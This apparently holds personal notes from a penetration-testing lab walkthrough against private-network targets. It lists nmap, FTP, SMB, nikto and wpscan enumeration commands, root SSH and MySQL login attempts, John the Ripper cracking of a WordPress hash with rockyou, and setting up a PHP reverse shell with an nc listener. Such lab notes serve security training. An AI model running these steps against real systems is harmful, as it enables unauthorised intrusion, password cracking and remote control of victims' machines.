<h2>steps</h2>

iwconfig

netdiscover


nmap -sT -sV -A -O -v -p 1-65535 192.168.0.29

 -A: Enable OS detection, version detection, script scanning, and traceroute

 -v: Increase verbosity

-sV (Version detection)
           Enables version detection, as discussed above. Alternatively, you can use -A, which enables version detection among other things.


-sT (TCP connect scan)
           TCP connect scan is the default TCP scan type when SYN scan is not an option. This is the case when a user does not have raw packet privileges. Instead
           of writing raw packets as most other scan types do, Nmap asks the underlying operating system to establish a connection with the target machine and port
           by issuing the connect system call



ftp 192.168.0.29

>anonymous
>

ls
get note

ssh root@192.168.0.29

smbclient -L 192.168.0.29

copy and enumerate files

nikto -h 192.168.0.103:1135

wpscan --url https://192.168.0.29:12380/blogblog 
--enumerate u --disable-tls-checks

wpscan --url https://192.168.0.29:12380/blogblog 
--enumerate ap --disable-tls-checks

mysql -u root -p -h 192.168.0.103


cat hash.txt
John:$P$fksalfalfsallksfaqpfq.

john --wordlist=/usr/share/wordlists/rockyou.txt
hash.txt


change the ip address of php-reverse-shell.php
to your kali machine
and change port to your choice you might need 
to netcat at that port
`nc -v -n -l -p 4444`
